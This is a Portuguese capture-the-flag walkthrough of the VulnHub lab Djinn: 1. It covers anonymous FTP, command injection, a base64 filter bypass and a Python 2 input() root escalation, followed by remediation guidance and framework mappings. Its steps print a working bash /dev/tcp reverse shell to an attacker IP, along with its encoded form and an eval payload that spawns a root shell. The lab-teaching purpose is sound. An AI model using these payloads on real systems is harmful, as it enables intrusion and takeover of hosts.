# Djinn: 1 — Três Desejos, Um Shell de Root

Você abre um servidor FTP, joga um jogo de adivinhação de números via netcat, bypassa um filtro de injeção de comando com base64, pula por dois usuários, e termina enganando um binário Python 2 para te dar root. A máquina é literalmente um gênio em uma garrafa: ela concede desejos, e o desejo real é um shell de root. Cara, o tema aqui é simplesmente genial. ✨

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Djinn: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/djinn-1,397/ |
| **Técnicas** | Acesso FTP anônimo, injeção de comando OS, bypass de filtro com base64, vazamento de credenciais em biblioteca Python, cadeia de sudo multi-hop, execução de código via Python 2 input() |
| **CVEs** | CWE-78 (Injeção de Comando OS — endpoint /wish), CWE-269 (Gerenciamento Impróprio de Privilégios — cadeia sudo), CWE-116 (abuso de eval via input() do Python 2) |
| **Grupos APT** | APT41: explora injeção de comando em aplicações web para acesso inicial em alvos corporativos; Lazarus Group: usa cadeias de escalação de privilégios multi-hop via misconfiguration de sudo em fases de pós-exploração |

---

## Resumo do Ataque

```
nmap: portas 21 (FTP), 1337 (jogo), 7331 (HTTP)
    |
    v
Login anônimo FTP → creds.txt, game.txt, message.txt
    |
    v
Porta 7331: gobuster → endpoint /wish (injeção de comando)
    |
    v
/wish: injeção de comando OS confirmada (id)
    |
    v
Filtro bloqueia palavras-chave → codificar payload em base64 → pipe para bash
    |
    v
Shell reverso como www-data
    |
    v
/opt/80/app.py → /home/nitish/.dev/creds.txt → su nitish
    |
    v
sudo -u sam genie -cmd new → shell como sam
    |
    v
sudo /root/lago → Python 2 input() → eval("__import__('os').system('/bin/bash')")
    |
    v
uid=0(root) → /root/proof.sh
```

---

## Metodologia

1. Descoberta de host e scan de portas: FTP (21), serviço de jogo (1337), HTTP (7331), SSH filtrado
2. Login anônimo FTP: baixar dicas de credenciais, descrição do jogo e recado
3. Enumeração web na porta 7331: encontrar endpoint de injeção de comando `/wish`
4. Explorar injeção de comando OS: bypass do filtro de palavras-chave com payload codificado em base64
5. Obter shell reverso como `www-data`
6. Encontrar credenciais no código-fonte da aplicação e pivotar para `nitish`
7. Abusar da regra `sudo genie` para mover para `sam`
8. Explorar Python 2 `input()` via `sudo lago` para escalar para root

---

## Passo 1 — Descoberta de Host e Scan de Portas

Começar com um scan completo de portas para encontrar todos os serviços:

```bash
sudo netdiscover -r 192.168.43.0/24
# Alvo: 192.168.43.134

nmap -p- -sV -sC 192.168.43.134
```

Saída esperada:

```
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
1337/tcp open     waste?
7331/tcp open     http    Werkzeug httpd
22/tcp   filtered ssh
```

Quatro entradas interessantes: FTP é amigável a acesso anônimo, 1337 é mistério, 7331 é um app web Python, e SSH está filtrado (só fica acessível após algo mudar). Caramba, essa porta 1337 grita energia de CTF.

**Nota real:** Deixar FTP aberto com acesso anônimo em uma máquina que também roda um app web é uma misconfiguration clássica. O APT41 usou servidores FTP anônimos como áreas de staging para payloads e dicas de credenciais em intrusões visando instituições financeiras asiáticas.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Login Anônimo FTP

```bash
ftp 192.168.43.134
# Usuário: anonymous
# Senha: (vazia ou anonymous)

ftp> ls -la
ftp> get creds.txt
ftp> get game.txt
ftp> get message.txt
ftp> quit
```

Ler os arquivos:

```bash
cat creds.txt
# nitish:p4ssw0rdStr3r0n9  (credenciais SSH — mas SSH está filtrado por agora)

cat message.txt
# Mensagem do admin do servidor, dicas sobre o jogo na porta 1337

cat game.txt
# Descrição do jogo de adivinhação de números
```

As credenciais SSH são inúteis agora (porta 22 está filtrada). Mas serão necessárias depois, quando tivermos um foothold.

**MITRE ATT&CK:** T1021.003 — Serviços Remotos (acesso FTP), T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração Web na Porta 7331

Abrir `http://192.168.43.134:7331/` — você recebe uma página básica. Executar força bruta de diretórios:

```bash
gobuster dir \
  -u http://192.168.43.134:7331 \
  -w /usr/share/wordlists/dirb/big.txt \
  -t 40
```

Resultados:

```
/genie    (Status: 403)
/wish     (Status: 200)
```

O endpoint `/genie` está proibido, mas `/wish` está acessível. Acessar: você recebe um campo de entrada de texto. Essa é a interface de concessão de desejos do gênio.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Injeção de Comando OS no /wish

Submeter `id` no campo do formulário. A resposta exibe:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Injeção de comando confirmada! Agora tentar um shell reverso:

```bash
# Tentativa direta:
bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
```

Resposta: "Wrong choice of words" — há um filtro de palavras-chave ativo. O filtro bloqueia palavras-chave relacionadas a shell como `bash`, `&`, `/dev/tcp`, `python`, `nc`, etc.

**Nota real:** Injeção de comando baseada em entrada (CWE-78) está consistentemente no Top 10 da OWASP (A03:2021 — Injeção). A combinação de um endpoint de execução de comando exposto e um filtro de palavras-chave inadequado espelha casos reais documentados em múltiplos relatórios HackerOne para plataformas SaaS.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 5 — Bypass do Filtro via Base64

Codificar o payload do shell reverso para bypass da detecção de palavras-chave:

```bash
# Payload: bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
echo "bash -i >& /dev/tcp/192.168.43.249/8080 0>&1" | base64
# Saída: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK
```

Iniciar o listener:

```bash
nc -nlvp 8080
```

Submeter o payload de bypass no formulário `/wish`:

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK | base64 -d | bash
```

Isso usa apenas `echo`, `base64` e `bash`, nenhuma das palavras-chave específicas bloqueadas. O shell chega como `www-data`. Mandou bem!

**Alternativa:** usar payload codificado em hex passado via `xxd -r -p | bash` ou payload buscado por curl de um servidor HTTP do atacante.

**Nota real:** Bypass de filtro base64 é uma das técnicas de bypass de filtro de injeção de comando mais documentadas. Qualquer blocklist de palavras-chave é fundamentalmente falha porque o espaço de ataque é infinito. A correção correta é nunca passar entrada do usuário para comandos shell; usar APIs parametrizadas.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados, T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 6 — Estabilização do Shell e Movimento Lateral para nitish

Estabilizar o shell:

```bash
python -c 'import pty;pty.spawn("/bin/sh")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter
```

Examinar o código-fonte da aplicação web:

```bash
cat /opt/80/app.py
# Referencia um caminho para creds.txt
```

Ler o arquivo de credenciais:

```bash
cat /home/nitish/.dev/creds.txt
# nitish:p4ssw0rdStr3r0n9
```

Trocar usuário:

```bash
su nitish
# Senha: p4ssw0rdStr3r0n9
id
# uid=1001(nitish)

cat /home/nitish/user.txt
```

**Nota real:** Armazenar credenciais em código-fonte de aplicação ou arquivos de configuração acessíveis é um dos achados mais comuns em avaliações de aplicações web. A brecha da Uber em 2022 envolveu credenciais commitadas em um repositório Git interno, levando a acesso à infraestrutura cloud.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos

---

## Passo 7 — Movimento Lateral para sam via sudo

Verificar permissões sudo para nitish:

```bash
sudo -l
```

Saída:

```
(sam) NOPASSWD: /usr/bin/genie
```

Nitish pode executar `genie` como `sam` sem senha. Usar a flag `-cmd` do binário `genie`:

```bash
sudo -u sam genie -cmd new
id
# uid=1002(sam)
```

Shell como `sam` obtido. Cadeias sudo multi-hop como essa são um padrão de ataque corporativo muito real: uma conta de serviço comprometida se transforma em outra, e depois em root.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo

---

## Passo 8 — Escalação de Privilégios via Abuso do input() do Python 2

Verificar permissões sudo de sam:

```bash
sudo -l
```

Saída:

```
(root) NOPASSWD: /root/lago
```

Executar:

```bash
sudo -u root /root/lago
```

O binário apresenta um menu. Escolher **opção 2** e digitar `num` no prompt de entrada:

```
Escolha opção: 2
Digite valor: num
```

O que acontece: no Python 2, `input()` é equivalente a `eval(raw_input(...))`. Quando você digita um nome de variável como `num`, Python o avalia como uma expressão Python. `num` não está definido, então gera um `NameError`, mas mais importante: você pode submeter qualquer expressão Python válida:

```
Digite valor: __import__('os').system('/bin/bash')
```

Isso executa `/bin/bash` como root.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
./proof.sh
```

**Alternativa:** `__import__('os').execl('/bin/sh','sh')` ou qualquer outra expressão Python que spawne um shell.

**Nota real:** Python 2 atingiu fim de vida em 1º de janeiro de 2020. Scripts usando `input()` no Python 2 para qualquer operação privilegiada são vulnerabilidades de execução de código. Esse padrão exato (Python 2 `input()` com sudo) já foi encontrado em scripts de implantação de produção em várias organizações durante testes de invasão.

**MITRE ATT&CK:** T1059.006 — Interpretador de Comando e Script: Python, T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Crackeado |
|---|---|---|---|
| Credencial SSH | `nitish:p4ssw0rdStr3r0n9` | FTP `creds.txt` + `/home/nitish/.dev/creds.txt` | SSH (filtrado) e su nitish |
| Flag de usuário | Conteúdo de `/home/nitish/user.txt` | Após pivô lateral para nitish | Prova de usuário |
| Prova de root | Saída de `/root/proof.sh` | Após exploração do input() Python 2 | Flag final |

---

## Lições Aprendidas

| Nº | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Acesso FTP anônimo expondo dicas de credenciais | FTP legado com acesso anônimo é encontrado consistentemente em redes corporativas; mesmo dados não críticos vazam contexto de ataque | Desabilitar FTP anônimo; migrar para SFTP com autenticação por chave |
| 2 | Injeção de comando no `/wish` com filtro de palavras-chave | Blocklists de palavras-chave são teatro de segurança; qualquer filtro de caracteres para injeção de comando é fundamentalmente bypassável | Nunca passar entrada do usuário para comandos shell; usar APIs parametrizadas e módulos subprocess com listas de argumentos |
| 3 | Credenciais em `/home/nitish/.dev/creds.txt` legíveis por www-data | Código-fonte e arquivos de configuração de aplicações rotineiramente contêm credenciais hardcoded, um dos principais achados em todo scan DAST | Aplicar permissões de arquivo com privilégio mínimo; usar gerenciadores de segredos; escanear código e configs em busca de credenciais hardcoded |
| 4 | Cadeia sudo multi-hop (nitish → sam → root) | Escalação de privilégios multi-hop por contas de serviço é um padrão de ataque corporativo documentado | Auditar regras sudo; remover concessões desnecessárias; exigir senhas para todo uso de sudo |
| 5 | Python 2 input() avaliado como código Python | EOL do Python 2 significa sem patches para essa classe de vulnerabilidade; scripts usando input() no Python 2 são bugs de execução de código se executados com privilégios elevados | Migrar para Python 3; nunca usar eval ou input() em dados fornecidos pelo usuário em scripts privilegiados |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | (su para nitish, depois sam) | T1021 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação: Sudo | T1548.003 |
| Execução | Execução | Interpretador de Comando e Script: Python | T1059.006 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar FTP anônimo:** definir `anonymous_enable=NO` em vsftpd.conf; migrar compartilhamento de arquivos para SFTP com autenticação por chave
2. **Corrigir injeção de comando no /wish:** substituir `os.system(entrada_usuario)` por chamada subprocess parametrizada; nunca passar entrada do usuário diretamente para execução de shell
3. **Remover filtro de entrada baseado em palavras-chave:** blocklists para injeção de shell são ineficazes; implementar validação por allowlist para tipos de entrada esperados
4. **Rotacionar credenciais em arquivos expostos:** remover `/home/nitish/.dev/creds.txt`; gerenciar segredos via variáveis de ambiente ou gerenciador de segredos
5. **Auditar e restringir regras sudo:** remover concessões sudo nitish→sam e sam→root; se genie/lago precisar ser executado como outro usuário, exigir senhas
6. **Migrar scripts Python 2 para Python 3:** `input()` no Python 3 é seguro; `input()` do Python 2 nunca deve ser usado em scripts privilegiados
7. **Aplicar permissões de privilégio mínimo:** arquivos de configuração de aplicação e armazenamentos de credenciais não devem ser legíveis por processos de servidor web

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços FTP e endpoints de aplicações web |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; restringir permissões de arquivos de credenciais |
| Proteger | Segurança de Dados | Mover segredos para gerenciador de segredos; sem credenciais em texto plano em arquivos de código |
| Detectar | Anomalias e Eventos | Alertar sobre uso anormal de sudo; monitorar endpoint /wish para tentativas de injeção |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; desabilitar endpoints vulneráveis; corrigir scripts Python 2 |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as regras sudo e arquivos de credenciais |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Privilégio Mínimo | Restringir concessões sudo ao mínimo necessário; exigir senhas |
| IA-5 | Gestão de Autenticadores | Rotacionar credenciais encontradas em /home/nitish/.dev/creds.txt |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP anônimo; remover scripts Python 2 com input() em contexto sudo |
| SI-10 | Validação de Entrada de Informação | Implementar validação por allowlist no /wish; substituir execução de shell por APIs seguras |

### CISA KEV

O padrão de injeção de comando no `/wish` (CWE-78) mapeia para classes de vulnerabilidade catalogadas em múltiplos Alertas CISA (AA21-131A, AA22-083A) descrevendo exploração de injeção de comando em aplicações web para acesso inicial. Organizações devem remediar vulnerabilidades de injeção de comando como itens de alta prioridade.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Software | MIL2 |

### MITRE D3FEND

- **D3-ACH:** Hardening de Configuração de Aplicação (desabilitar FTP anônimo; remover scripts Python 2 em sudo)
- **D3-OAM:** Gestão Administrativa do Sistema Operacional (restrições sudo; privilégio mínimo para permissões de arquivo)
- **D3-IAVV:** Validação de Entrada (validação por allowlist no /wish; substituir execução de shell)

---

## Considerações Finais

Djinn: 1 é uma aula magistral em design de cadeia de ataque. Cada passo flui naturalmente do anterior: as credenciais FTP que não podem ser usadas imediatamente, a porta do jogo que dá dicas do que está por vir, o bypass do filtro que recompensa quem conhece seus truques de codificação, e a pegadinha do Python 2 no final.

A escalação via `input()` do Python 2 é especialmente instrutiva: é uma classe real de vulnerabilidade, não um truque de CTF. Sistemas de produção rodando Python 2 end-of-life com `input()` em scripts privilegiados são genuinamente exploráveis exatamente dessa forma. Sempre que você ver um script Python 2 em uma regra `sudo`, verifique se há chamadas `input()`.

Três desejos concedidos. Root alcançado. GG sem retry.

Thanks guys!! (❍ᴥ❍ʋ)
